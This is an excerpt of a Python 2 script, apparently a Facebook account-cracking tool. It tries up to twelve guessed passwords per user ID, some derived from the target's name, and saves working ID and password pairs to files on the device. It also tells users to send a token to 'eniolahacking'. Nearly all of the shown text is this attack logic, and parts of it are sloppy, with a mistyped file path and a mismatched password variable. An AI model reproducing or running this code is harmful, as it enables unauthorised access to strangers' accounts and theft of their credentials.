...
def reg():
    ...
    if to in r:
        ...
        print ''
        print ' \033[1;92mCopy token id and send to eniolahacking'
        print ''
...
def a_s():
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'loc' in q:
                print '\033[1;92m[ITZ EFK-OK] ' + uid + ' | ' + pass1
                ok = open('/sdcard/ids/ITZ EFK_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\x1b[1;93m[ITZ EFK-CP] ' + uid + ' | ' + pass1
                cp = open('ITZ EFK_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print '\033[1;92m[ITZ EFK-OK] ' + uid + ' | ' + pass2
                    ok = open('/sdcard/ids/ITZ EFJ_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[1;93m[ITZ EFK-CP] ' + uid + ' | ' + pass2
                    cp = open('ITZ EFK_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\033[1;92m[ITZ EFK-OK] ' + uid + ' | ' + pass3
                        ok = open('/sdcard/ids/ITZ EFK_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[1;93m[ITZ EFK-CP] ' + uid + ' | ' + pass3
                        cp = open('ITZ EFK_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\033[1;92m[ITZ EFK-OK] ' + uid + ' | ' + pass4
                            ok = open('/sdcard/ids/ITZ EFK_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[1;93m[ITZ EFK-CP] ' + uid + ' | ' + pass4
                            cp = open('ITZ EFK_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            ...
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\033[1;92m[ITZ EFK-OK] ' + uid + ' | ' + pass5
                                ok = open('/sdcard/ids/ITZ EFK_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error']:
                                print '\x1b[1;93m[ITZ EFK-CP] ' + uid + ' | ' + pass5
                                cp = open('ITZ EFK_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
			        ...
			        pass6 = name.lower() + p6
                                ...
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\033[1;92m[ITZ EFK-OK] ' + uid + ' | ' + pass6
                                    ok = open('/sdcard/ids/ITZ EFK_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error']:
                                    print '\x1b[1;93m[ITZ EFK-CP] ' + uid + ' | ' + pass6
                                    cp = open('ITZ EFK_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    ...
                                    q = json.loads(data)
                                    if 'loc' in q:
                                        print '\033[1;92m[ITZ EFK-OK] ' + uid + ' | ' + pass7
                                        ok = open('/sdcard/ids/ITZ EFK_OK.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error']:
                                        print '\x1b[1;93m[ITZ EFK-CP] ' + uid + ' | ' + pass7
                                        cp = open('ITZ EFK_CP.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        ...
                                        q = json.loads(data)
                                        if 'loc' in q:
                                            print '\033[1;92m[ITZ EFK-OK] ' + uid + ' | ' + pass8
                                            ok = open('/sdcard/ids/(ITZ EFK_OK.txt', 'a')
                                            ok.write(uid + ' | ' + pass8 + '\n')
                                            ok.close()
                                            oks.append(uid + pass8)
                                        elif 'www.facebook.com' in q['error']:
                                            print '\x1b[1;93m[ITZ EFK-CP] ' + uid + ' | ' + pass8
                                            cp = open('ITZ EFK_CP.txt', 'a')
                                            cp.write(uid + ' | ' + pass8 + '\n')
                                            cp.close()
                                            ...
                                            q = json.loads(data)
                                            if 'loc' in q:
                                                print '\033[1;92m[ITZ EFK-OK] ' + uid + ' | ' + pass9
                                                ok = open('/sdcard/ids/ITZ EFK_OK.txt', 'a')
                                                ok.write(uid + ' | ' + pass9 + '\n')
                                                ok.close()
                                                oks.append(uid + pass9)
                                            elif 'www.facebook.com' in q['error']:
                                                print '\x1b[1;93m[ITZ EFK-CP] ' + uid + ' | ' + pass9
                                                cp = open('ITZ EFK_CP.txt', 'a')
                                                cp.write(uid + ' | ' + pass9 + '\n')
                                                cp.close()
                                                ...
                                                q = json.loads(data)
                                                if 'loc' in q:
                                                    print '\033[1;92m[ITZ EFK-OK] ' + uid + ' | ' + pass10
                                                    ok = open('/sdcard/ids/ITZ EFK_OK.txt', 'a')
                                                    ok.write(uid + ' | ' + pass10 + '\n')
                                                    ok.close()
                                                    oks.append(uid + pass10)
                                                elif 'www.facebook.com' in q['error']:
                                                    print '\x1b[1;93m[ITZ EFK-CP] ' + uid + ' | ' + pass10
                                                    cp = open('ITZ EFK_CP.txt', 'a')
                                                    cp.write(uid + ' | ' + pass10 + '\n')
                                                    cp.close()
                                                    ...
                                                    q = json.loads(data)
                                                    if 'loc' in q:
                                                        print '\033[1;92m[ITZ EFK-OK] ' + uid + ' | ' + pass11
                                                        ok = open('/sdcard/ids/ITZ EFK_OK.txt', 'a')
                                                        ok.write(uid + ' | ' + pass11 + '\n')
                                                        ok.close()
                                                        oks.append(uid + pass11)
                                                    elif 'www.facebook.com' in q['error']:
                                                        print '\x1b[1;93m[ITZ EFK-CP] ' + uid + ' | ' + pass12
                                                        cp = open('ITZ EFK_CP.txt', 'a')
                                                        cp.write(uid + ' | ' + pass11 + '\n')
                                                        cp.close()
                                                        ...
                                                        q = json.loads(data)
                                                        if 'loc' in q:
                                                            print '\033[1;92m[ITZ EFK-OK] ' + uid + ' | ' + pass12
                                                            ok = open('/sdcard/ids/ITZ EFK_OK.txt', 'a')
                                                            ok.write(uid + ' | ' + pass12 + '\n')
                                                            ok.close()
